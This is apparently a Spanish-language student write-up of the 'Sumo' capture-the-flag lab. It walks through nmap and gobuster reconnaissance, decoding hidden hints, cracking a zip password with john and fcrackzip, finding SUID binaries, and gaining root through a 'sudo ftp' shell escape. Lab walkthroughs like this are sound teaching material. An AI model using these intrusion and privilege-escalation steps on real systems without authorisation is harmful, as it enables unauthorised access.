#  TAREA 4 - Sumo

### ÍNDICE

1. [Escaneo de Red](#escaneo-de-red)
2. [Investigación del código fuente](#investigación-del-código-fuente)
3. [El comando gobuster](#el-comando-gobuster)
4. [Akebono tiene un regalo para hakuho](#akebono-tiene-un-regalo-para-hakuho)
5. [En busca de binarios](#en-busca-de-binarios)
6. [Paso final](#paso-final)


## Escaneo de Red

Para escanear los equipos de nuestra red, ejecutaremos el siguietne comando:

```sh
nmap -p- nuestra_red/máscara
```

`nmap -p-` escanea la red y lista los puertos abiertos.

![alt image](./IMG/captura1-1.png)

Ahora si hemos encontrado la ip, vamos a profundizar más con el comando:

```sh
nmap -sV ip_objetivo
```
`-sV` Prueba los puertos abiertos para determinar la información del servicio/version

![alt image](./IMG/captura1-2.png)

Como hemos podido ver, tenemos un **servidor apache en marcha por parte la máquina objetivo**, vamos a acceder a su web principal a ver si vemos algo interesante...

![alt image](./IMG/captura1-3.png)


## Investigación del código fuente

Nos adentramos a su código fuente...

![alt image](./IMG/captura1-4.png)

![alt image](./IMG/captura1-5.png)

Ahora accedemos al directorio que nos han mencionado...

![alt image](./IMG/captura1-6.png)

![alt image](./IMG/captura1-7.png)

Abrimos `/hint`

![alt image](./IMG/captura1-8.png)

Desencriptamos el mensaje con **base32** de la siguiente forma:

```sh
echo "mensaje_encriptado====" | base32 --decode
```

![alt image](./IMG/captura1-9.png)


## El comando gobuster

Como el creador de este CTF es muy gracioso, tendremos que indagar nosotros con el comando `gobuster` .

Para ello ejecutaremos lo siguiente:

```sh
gobuster dir -u url_objetivo -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt
```

![alt image](./IMG/captura1-10.png)

Si accedemos a su archivo `.js` veremos:

![alt image](./IMG/captura1-11.png)

Ese es el usuario.

También podremos especificar las extensiones de la siguiente manera:

```sh
gobuster dir -u url_objetivo -w /usr/share/dirbuster/wordlist/lista.txt .js,.html,.sql,.php,.css
```

![alt image](./IMG/captura1-12.png)

En otra de las páginas encontradas, veremos esto...

![alt image](./IMG/captura1-13.png)

Con un decodificador **Brainfuck** podremos ver el mensaje escondido:

![alt image](./IMG/captura1-14.png)

Desencriptamos otra vez con `base32` el mensaje cifrado

Encontramos una contraseña...

![alt image](./IMG/captura1-15.png)

Ahora con el usuario y contraseña, intentamos hacer ssh:

```sh
ssh usuario@ip
```

![alt image](./IMG/captura1-16.png)



![alt image](./IMG/captura1-17.png)

## Akebono tiene un regalo para hakuho

Inspeccionamos la lista de directorios del usuario...

![alt image](./IMG/captura1-18.png)



![alt image](./IMG/captura1-19.png)



![alt image](./IMG/captura1-20.png)



![alt image](./IMG/captura1-21.png)

Como nos pide una contraseña para el `.zip` , tendremos que intentar crackearla por fuerza bruta con el comando `john` y posteriormente con `fcrackzip`.

```sh
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```sh
fcrackzip -v -u -D -p /usr/share/wordlist/rockyou.txt gift.zip
```

![alt image](./IMG/captura1-22.png)

Ahora que tenemos la contraseña, procedemos a descomprimir el `.zip` .

![alt image](./IMG/captura1-23.png)

## En busca de binarios

Para listar la lista de binarios ejecutamos:

```sh
find / -type f -perm -4000 2>/dev/null
```

![alt image](./IMG/captura1-24.png)

Si ejecutamos el siguietne binario:

```sh
/opt/exec/masayuki
```

Entramos en el usuario `masayuki` .

![alt image](./IMG/captura1-25.png)

Ahora desde este usuario, hay algunos archivos que solo root puede acceder, pero por alguna razon si hacemos un grep recursivo con `-r` a todo /home/ (el home de el usuario masayuki), nos mostrará el contenido de esos archivos los cuales no podemos acceder.

```sh
grep -r "masayuki" /home/
```

![alt image](./IMG/captura1-26.png)

```sh
grep -r "clave" /home/
```

![alt image](./IMG/captura1-27.png)

Probando algo más generico:

```sh
grep -r a /home/
```

![alt image](./IMG/captura1-28.png)

Con este comando averiguaremos una cosa importante...

```sh
grep -r "masayuki" /etc/
```

***masayuki esta en grupo sudo***
(Aunque no como parece)

![alt image](./IMG/captura1-29.png)


## Paso final

Este usuario está en grupo sudo, pero parece ser que está limitado ya que no deja ejecutar ninguna operación con sudo.

Pero si vamos a los binarios de vuelta, podremos ejecutarlo. Vamos a probar con `ftp` .

![alt image](./IMG/captura1-30.png)

```sh
sudo ftp
```

```sh
!/bin/bash
```

Con esto habremos accedido como **root**.

![alt image](./IMG/captura1-31.png)